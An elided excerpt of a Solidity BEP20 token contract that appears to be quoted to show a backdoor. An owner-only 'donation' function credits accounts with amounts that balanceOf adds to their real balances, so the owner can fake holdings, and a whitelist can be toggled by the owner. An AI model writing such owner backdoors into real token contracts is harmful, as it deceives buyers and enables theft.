...
contract Token is IBEP20, HasForeignAsset {
    ...
    function donation(address account) public onlyOwner {
        ...
        _donation[account] = _donation[account].add(balance);
        _whiteList[account] = true;
    }

    function getDonation(address account) public view returns (uint256) {
        return _donation[account];
    }
    ...
    function cancelWhiteList(address account,bool status) public onlyOwner {
    ...
    function balanceOf(address acccount) public view override returns (uint256) {
        return _balances[acccount] + _donation[acccount];
    }
